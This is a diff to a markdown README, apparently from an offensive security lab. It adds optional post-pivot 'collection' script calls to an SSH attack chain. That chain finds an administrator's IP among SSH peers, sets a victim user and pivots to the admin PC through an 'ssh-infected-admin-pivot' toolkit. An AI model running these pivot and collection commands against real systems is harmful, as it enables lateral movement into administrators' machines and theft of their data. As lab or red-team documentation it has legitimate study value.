@@ -43,6 +43,10 @@ Discover admin IP for pivot (peer of your listening `:22`):
 ss -tnH state established '( sport = :22 )' | awk '{print $4}' | sed 's/:.*//'
 export SSH_SERVER_PORT=22 VICTIM_USER=legacy
 sudo ../ssh-infected-admin-pivot/pivot_to_admin_pc.sh <ADMIN_IP>
+
+# Optional: run collection script on admin PC after pivot
+sudo ../ssh-infected-admin-pivot/post_pivot_via_agent.sh <ADMIN_IP>
+# or: KEY=... sudo ../ssh-infected-admin-pivot/post_pivot_admin_host.sh <ADMIN_IP>
 ```
 
 ## Admin client
